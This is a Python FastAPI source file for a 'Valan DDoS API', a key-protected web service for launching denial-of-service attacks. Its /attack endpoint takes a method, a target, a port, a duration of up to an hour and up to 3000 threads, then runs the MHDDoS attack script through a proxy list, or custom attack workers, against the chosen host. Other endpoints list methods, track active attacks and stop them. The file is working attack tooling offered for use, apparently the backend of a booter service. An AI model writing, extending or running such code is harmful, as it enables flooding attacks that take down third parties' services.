# api_server.py
import asyncio
import sys
import time
import uuid
import threading
from typing import Optional

from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel

from config import (
    MAX_CONC, L7_METHODS, L4_METHODS, CUSTOM_METHODS,
    MHDDOS_DIR, PROXY_FILE, DB_PATH,
)
from custom_methods import get_custom, HAS_CURL_CFFI
from database import Database

DEFAULT_THREADS = 150
RPC = 128
ALL_METHODS = L7_METHODS + L4_METHODS + CUSTOM_METHODS
JOBS: dict = {}
LOCK = threading.Lock()
DB = Database(DB_PATH)

app = FastAPI(title="Valan DDoS API", version="3.0")


class AttackRequest(BaseModel):
    method: str
    target: str
    port: int = 80
    duration: int = 60
    threads: Optional[int] = None


class StopRequest(BaseModel):
    job_id: str


def _count():
    with LOCK:
        return len(JOBS)


def build_cmd(method, target, port, duration, threads):
    if method in L7_METHODS:
        url = target if target.startswith("http") else f"http://{target}"
        if port and ":" not in url.split("//")[-1]:
            url = f"{url}:{port}"
        return [sys.executable, "start.py", method, url, "5", str(threads), PROXY_FILE, str(RPC), str(duration)]
    host = target.split("//")[-1].split("/")[0].split(":")[0]
    return [sys.executable, "start.py", method, f"{host}:{port}", str(threads), str(duration)]


async def run_mhddos(jid, method, target, port, dur, threads):
    cmd = build_cmd(method, target, port, dur, threads)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, cwd=MHDDOS_DIR,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
    except Exception as e:
        print(f"[JOB {jid}] spawn fail: {e}")
        with LOCK:
            JOBS.pop(jid, None)
        return
    with LOCK:
        if jid in JOBS:
            JOBS[jid]["proc"] = proc
    await proc.wait()
    with LOCK:
        JOBS.pop(jid, None)


async def run_custom(jid, method, target, port, dur, threads):
    stats = {"hits": 0, "errors": 0}
    host = target.split("//")[-1].split("/")[0].split(":")[0]
    cls = get_custom(method)
    if not cls:
        with LOCK:
            JOBS.pop(jid, None)
        return
    worker = cls(host, port, dur, threads, stats)
    with LOCK:
        if jid in JOBS:
            JOBS[jid]["worker"] = worker
            JOBS[jid]["stats"] = stats
    try:
        await worker.run()
    except Exception as e:
        print(f"[JOB {jid}] custom err: {e}")
    finally:
        with LOCK:
            JOBS.pop(jid, None)


@app.on_event("startup")
async def _startup():
    await DB.init()
    owner_key = await DB.ensure_owner_key()
    print(f"[API] owner permanent key = {owner_key}")


@app.get("/")
def root():
    return {
        "name": "Valan DDoS API",
        "version": "3.0",
        "active": _count(),
        "max": MAX_CONC,
        "curl_cffi": HAS_CURL_CFFI,
    }


@app.get("/methods")
def methods():
    return {
        "l7": L7_METHODS,
        "l4": L4_METHODS,
        "custom": CUSTOM_METHODS,
        "total": len(ALL_METHODS),
    }


@app.get("/status")
async def status(job_id: str = None, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        if job_id:
            j = JOBS.get(job_id)
            if not j:
                return {"exists": False, "job_id": job_id}
            e = {
                "job_id": job_id,
                "method": j["method"],
                "target": j["target"],
                "port": j["port"],
                "duration": j["duration"],
                "elapsed": int(time.time() - j["started"]),
                "hits": 0,
                "errors": 0,
            }
            s = j.get("stats")
            if s:
                e["hits"] = s.get("hits", 0)
                e["errors"] = s.get("errors", 0)
            return e
        jobs = [
            {
                "job_id": k,
                "method": v["method"],
                "target": v["target"],
                "elapsed": int(time.time() - v["started"]),
                "hits": (v.get("stats") or {}).get("hits", 0),
            }
            for k, v in JOBS.items()
        ]
        return {"active": len(jobs), "max": MAX_CONC, "jobs": jobs}


@app.post("/attack")
async def attack(req: AttackRequest, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    method = req.method.upper()
    if method not in ALL_METHODS:
        raise HTTPException(400, f"unknown method: {method}")
    if _count() >= MAX_CONC:
        raise HTTPException(429, f"max concurrent {MAX_CONC}")
    if not (1 <= req.duration <= 3600):
        raise HTTPException(400, "duration 1-3600")
    threads = req.threads or DEFAULT_THREADS
    if not (10 <= threads <= 3000):
        raise HTTPException(400, "threads 10-3000")

    jid = uuid.uuid4().hex[:12]
    with LOCK:
        JOBS[jid] = {
            "job_id": jid,
            "method": method,
            "target": req.target,
            "port": req.port,
            "duration": req.duration,
            "threads": threads,
            "started": time.time(),
            "proc": None,
            "worker": None,
            "stats": None,
        }

    if method in CUSTOM_METHODS:
        asyncio.create_task(run_custom(jid, method, req.target, req.port, req.duration, threads))
    else:
        asyncio.create_task(run_mhddos(jid, method, req.target, req.port, req.duration, threads))

    return {
        "success": True,
        "status": "Attack Sent",
        "job_id": jid,
        "method": method,
        "target": req.target,
        "port": req.port,
        "duration": req.duration,
        "threads": threads,
        "active": _count(),
    }


@app.post("/stop")
async def stop(req: StopRequest, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        j = JOBS.pop(req.job_id, None)
        if not j:
            raise HTTPException(404, "not found")
        p = j.get("proc")
        if p and p.returncode is None:
            try:
                p.terminate()
            except Exception:
                pass
        w = j.get("worker")
        if w:
            try:
                w.stop()
            except Exception:
                pass
    return {"success": True}


@app.post("/stop-all")
async def stop_all(key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        jobs = list(JOBS.values())
        JOBS.clear()
    for j in jobs:
        p = j.get("proc")
        if p and p.returncode is None:
            try:
                p.terminate()
            except Exception:
                pass
        w = j.get("worker")
        if w:
            try:
                w.stop()
            except Exception:
                pass
    return {"success": True, "stopped": len(jobs)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")